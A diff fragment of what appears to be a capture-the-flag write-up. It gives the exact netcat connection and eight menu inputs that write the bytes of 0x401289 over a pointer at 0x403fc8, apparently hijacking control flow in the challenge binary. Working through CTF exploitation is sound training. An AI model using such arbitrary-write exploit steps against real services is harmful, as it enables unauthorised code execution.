@@ -74,3 +74,36 @@ gef➤  set $rdx=0x9
 ```
 
 
+Here’s exactly what to type, in order, after connecting (`nc challs.nusgreyhats.org 33021`):
+
+- Choice: 2  
+    Address: 0x403fc8  
+    Byte: 0x89
+    
+- Choice: 2  
+    Address: 0x403fc9  
+    Byte: 0x12
+    
+- Choice: 2  
+    Address: 0x403fca  
+    Byte: 0x40
+    
+- Choice: 2  
+    Address: 0x403fcb  
+    Byte: 0x00
+    
+- Choice: 2  
+    Address: 0x403fcc  
+    Byte: 0x00
+    
+- Choice: 2  
+    Address: 0x403fcd  
+    Byte: 0x00
+    
+- Choice: 2  
+    Address: 0x403fce  
+    Byte: 0x00
+    
+- Choice: 2  
+    Address: 0x403fcf  
+    Byte: 0x00
